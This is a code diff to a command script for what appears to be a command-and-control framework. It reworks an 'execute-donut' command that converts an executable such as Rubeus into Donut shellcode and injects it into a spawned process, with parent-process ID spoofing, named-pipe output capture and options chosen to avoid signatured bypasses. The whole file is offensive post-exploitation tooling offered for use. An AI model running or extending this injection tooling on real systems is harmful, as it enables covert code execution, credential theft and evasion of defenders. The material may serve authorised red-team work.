@@ -24,47 +24,34 @@ cmd_execute_assembly.setPreHook(function (id, cmdline, parsed_json, ...parsed_li
 });
 
 var cmd_execute_donut = ax.create_command("execute-donut", "Execute EXE using Donut and process injection", "execute-donut -P 1234 /tmp/Rubeus.exe triage");
-cmd_execute_donut.addArgString("-P", false, "PPID to spoof (default: 0, PPID spoofing enabled if set)");
-cmd_execute_donut.addArgString("-p", false, "Program to spawn and inject into (default: notepad.exe)");
-cmd_execute_donut.addArgString("-a", false, "Architecture x86/x64 (default: x64)");
-cmd_execute_donut.addArgString("path", false, "Path to local EXE/DLL (Required for execution)");
+cmd_execute_donut.addArgFlagInt("-P", "ppid", false, "PPID to spoof (default: 0, PPID spoofing enabled if set)");
+cmd_execute_donut.addArgFlagString("-p", "spawn", false, "Program to spawn and inject into (default: notepad.exe)");
+cmd_execute_donut.addArgFlagString("-a", "arch", false, "Architecture x86/x64 (default: x64)");
+cmd_execute_donut.addArgString("path", true, "Path to local EXE/DLL (Required for execution)");
 cmd_execute_donut.addArgString("params", false, "Arguments for the executable");
+
 cmd_execute_donut.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
-    var args = cmdline.split(" ");
+    // Parsing is now handled by the framework into parsed_json
+    // Flags are mapped by their 'name' (2nd arg in addArgFlag*)
 
     var ppid = 0;
+    if (parsed_json["ppid"]) ppid = parsed_json["ppid"];
+
     var spawn = "notepad.exe";
+    if (parsed_json["spawn"]) spawn = parsed_json["spawn"];
+
     var arch = "x64";
-    var exe_path = "";
-    var exe_args = "";
+    if (parsed_json["arch"]) arch = parsed_json["arch"];
 
-    // Use a unique numeric ID for the job (using timestamp)
-    var jobId = (Date.now() & 0xFFFFFFF); // Fit in positive int32
+    var exe_path = parsed_json["path"];
+    var exe_args = parsed_json["params"] || "";
 
-    var i = 1;
-    while (i < args.length) {
-        if (args[i] == "-P") {
-            if (i + 1 >= args.length) { ax.console_message(id, "Error", "error", "Missing value for -P"); return; }
-            ppid = parseInt(args[i + 1]);
-            i += 2;
-        } else if (args[i] == "-p") {
-            if (i + 1 >= args.length) { ax.console_message(id, "Error", "error", "Missing value for -p"); return; }
-            spawn = args[i + 1];
-            i += 2;
-        } else if (args[i] == "-a") {
-            if (i + 1 >= args.length) { ax.console_message(id, "Error", "error", "Missing value for -a"); return; }
-            arch = args[i + 1];
-            i += 2;
-        } else {
-            if (exe_path == "") {
-                exe_path = args[i];
-                var rest = args.slice(i + 1).join(" ");
-                if (rest.length > 0) exe_args = rest;
-                break;
-            }
-            i++;
-        }
-    }
+    // Default Donut Options
+    var compress = 1; // 1=None, 2=aPLib
+    var entropy = 3; // 3=Default (Random+Symmetric)
+    var exit_opt = 2; // 1=Thread, 2=Process, 3=Block
+    var bypass = 1; // 1=None (Donut default bypass is signatured a lot)
+    var headers = 1; // 1=Overwrite
 
     // Adjust spawn for x86 if using default
     if (arch == "x86" && spawn == "notepad.exe") {
@@ -73,9 +60,10 @@ cmd_execute_donut.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
 
     var shellcode_b64 = "";
     var pipeName = "";
+    var stubBase64 = "";
 
     // Generate Shellcode
-    if (exe_path == "") {
+    if (!exe_path || exe_path.length == 0) {
         ax.console_message(id, "Error", "error", "No executable path provided");
         return;
     }
@@ -103,32 +91,42 @@ cmd_execute_donut.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
         return;
     }
 
-    // If PPID is specified, use pipe-based output capture
+    // If PPID is specified, we need the pipe setup (PPID Mode)
     if (ppid > 0) {
         // Generate unique pipe name
         var timestamp = Date.now().toString(16).toUpperCase();
         pipeName = "\\\\.\\pipe\\dnt_" + timestamp.substring(timestamp.length - 8);
 
-        // Read the architecture-specific stub (returns Base64 string)
-        var stubBase64 = ax.file_read(ax.script_dir() + "execute-donut/pipe_shellcode/stub_" + arch + ".bin");
+        // Read the architecture-specific stub
+        stubBase64 = ax.file_read(ax.script_dir() + "execute-donut/pipe_shellcode/stub_" + arch + ".bin");
         if (stubBase64.length == 0) {
             ax.console_message(id, "Error", "error", "Failed to read redirect stub for " + arch);
             return;
         }
-
-        // Use the pipe-enabled shellcode generator with external stub
-        shellcode_b64 = ax.donut_generate_with_pipe(exe_path, exe_args, arch, pipeName, stubBase64);
-    } else {
-        // Normal shellcode (handle inheritance works without PPID)
-        shellcode_b64 = ax.donut_generate(exe_path, exe_args, arch, "exe");
     }
+
+    // Call unified donut_generate
+    shellcode_b64 = ax.donut_generate(
+        exe_path,
+        exe_args,
+        arch,
+        pipeName,
+        stubBase64,
+        compress,
+        entropy,
+        exit_opt,
+        bypass,
+        headers
+    );
 
     if (!shellcode_b64 || shellcode_b64.length == 0) {
         return;
     }
 
     // Pack: JobId(i), PPID(i), Spawn(s), PipeName(s), Shellcode(b)
-    // Removed 'action' from args
+    // Use a unique numeric ID for the job (using timestamp)
+    var jobId = (Date.now() & 0xFFFFFFF); // Fit in positive int32
+
     var bof_params = ax.bof_pack("int,int,cstr,cstr,bytes", [jobId, ppid, spawn, pipeName, shellcode_b64]);
     var bof_path = ax.script_dir() + "_bin/execute-donut." + ax.arch(id) + ".o";
     var message = "Task: execute-donut " + ax.file_basename(exe_path);
